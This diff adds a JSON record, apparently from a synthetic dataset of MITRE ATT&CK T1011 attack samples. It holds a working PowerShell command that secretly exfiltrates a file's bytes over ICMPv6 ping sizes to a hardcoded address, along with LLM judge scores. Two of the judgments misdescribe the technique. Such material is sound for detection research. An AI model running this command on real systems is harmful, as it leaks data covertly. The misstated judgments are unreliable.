@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$sync='fe80::1%13'; $d='fd00:c001::7'; Test-Connection -ComputerName $sync -Count 1 -BufferSize 333 -IPv6 -Quiet | Out-Null; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (333 + $_) -IPv6 -Quiet | Out-Null }",
+  "explanation": "Sends a sync marker ICMPv6 echo, then exfiltrates bytes via payload size to a ULA, making use of an alternate network medium per T1011.",
+  "rationale_steps": [
+    "Emit a distinct-size ICMPv6 echo as a synchronization preamble.",
+    "Stream file bytes by encoding them in -BufferSize with a known base.",
+    "Use IPv6 destinations to avoid common monitored IPv4 paths."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-bcd0af6a",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes and parentheses, valid variable assignments, proper piping, and correct usage of the Test-Connection cmdlet with appropriate parameters.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively implements exfiltration over an alternate protocol (ICMPv6) by encoding file data in packet buffer sizes, aligning with T1011, though it uses IPv6 link-local and unique local addresses rather than true external exfiltration endpoints.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:05:26.518774Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct variable assignments, cmdlet usage, parameter formats, and proper use of semicolons and pipes.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs plausible data exfiltration via ICMPv6 buffer size manipulation, but it does not involve any 'dynamic resolution' of network endpoints as defined by MITRE ATT&CK T1011, as the target IPv6 addresses are hardcoded.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T05:05:34.446378Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid PowerShell with balanced quoting, proper statement separators, correct Test-Connection parameters, and appropriate pipeline/script block usage.",
+        "semantic_score": 1,
+        "semantic_justification": "Implements ICMPv6-based exfiltration to static IPv6 addresses and does not perform any dynamic resolution/DGA or DNS behaviors described for T1011.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T05:06:02.170556Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
